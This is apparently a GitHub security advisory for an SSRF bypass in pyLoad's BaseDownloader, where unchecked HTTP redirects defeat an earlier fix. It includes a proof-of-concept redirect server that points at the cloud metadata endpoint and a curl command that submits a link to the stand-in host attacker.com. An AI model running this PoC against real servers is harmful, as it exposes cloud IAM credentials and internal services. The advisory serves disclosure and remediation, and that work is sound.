# [C] pyLoad: SSRF filter bypass via HTTP redirect in BaseDownloader (Incomplete fix for CVE-2026-33992)

## Summary
Severity: Critical
Advisory: GHSA-7gvf-3w72-p2pg
CVE: CVE-2026-35459
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N (CVSS_V4)
Published: 2026-04-04
Source: https://github.com/advisories/GHSA-7gvf-3w72-p2pg
Type: github-advisory

## Affected
- PyPI: `pyload-ng` — affected >=0

## Details
## Summary

The fix for CVE-2026-33992 (GHSA-m74m-f7cr-432x) added IP validation to `BaseDownloader.download()` that checks the hostname of the initial download URL. However, pycurl is configured with `FOLLOWLOCATION=1` and `MAXREDIRS=10`, causing it to automatically follow HTTP redirects. Redirect targets are never validated against the SSRF filter.

An authenticated user with ADD permission can bypass the SSRF fix by submitting a URL that redirects to an internal address.

## Root Cause

The SSRF check at `src/pyload/plugins/base/downloader.py:335-341` validates only the initial URL:

    dl_hostname = urllib.parse.urlparse(dl_url).hostname
    if is_ip_address(dl_hostname) and not is_global_address(dl_hostname):
        self.fail(...)
    else:
        for ip in host_to_ip(dl_hostname):
            if not is_global_address(ip):
                self.fail(...)

After the check passes, `_download()` is called. pycurl is configured at `src/pyload/core/network/http/http_request.py:114-115` to follow redirects:

    self.c.setopt(pycurl.FOLLOWLOCATION, 1)
    self.c.setopt(pycurl.MAXREDIRS, 10)

No `CURLOPT_REDIR_PROTOCOLS` restriction is set anywhere in HTTPRequest. Redirect targets bypass the SSRF filter entirely.

## PoC

Redirect server (attacker-controlled):

    from http.server import HTTPServer, BaseHTTPRequestHandler

    class RedirectHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header("Location", "http://169.254.169.254/metadata/v1.json")
            self.end_headers()

    HTTPServer(("0.0.0.0", 8888), RedirectHandler).serve_forever()

Submit to pyload (requires ADD permission):

    curl -b cookies.txt -X POST 'http://target:8000/json/add_package' \
      -d 'add_name=ssrf-test&add_dest=1&add_links=http://attacker.com:8888/redirect'

The SSRF check resolves `attacker.com` to a public IP and passes. pycurl follows the 302 redirect to `http://169.254.169.254/metadata/v1.json` without validation. Cloud metadata is downloaded and saved to the storage folder.

## Impact

An authenticated user with ADD permission can access:

- Cloud metadata endpoints (169.254.169.254) for AWS, GCP, DigitalOcean, Azure — including IAM credentials and instance identity
- Internal network services (10.x, 172.16.x, 192.168.x)
- Localhost services (127.0.0.1)

This is the same impact as CVE-2026-33992 (rated Critical), achieved through a single redirect hop. The severity is reduced from Critical to High because authentication with ADD permission is now required.

## Suggested Fix

Disable automatic redirect following and validate each redirect target:

    # In HTTPRequest.__init__():
    self.c.setopt(pycurl.FOLLOWLOCATION, 0)

Then implement manual redirect following in the download logic with SSRF validation at each hop. Alternatively, restrict redirect protocols:

    self.c.setopt(pycurl.REDIR_PROTOCOLS, pycurl.PROTO_HTTP | pycurl.PROTO_HTTPS)

And add a pycurl callback to validate redirect destination IPs before following.

## Resources

- CVE-2026-33992 / GHSA-m74m-f7cr-432x: Original SSRF (Critical, unauthenticated). This bypass requires ADD permission.

## References
- https://github.com/pyload/pyload/security/advisories/GHSA-7gvf-3w72-p2pg
- https://nvd.nist.gov/vuln/detail/CVE-2026-33992
- https://nvd.nist.gov/vuln/detail/CVE-2026-35459
- https://github.com/pyload/pyload/commit/33c55da084320430edfd941b60e3da0eb1be9443
- https://github.com/pyload/pyload
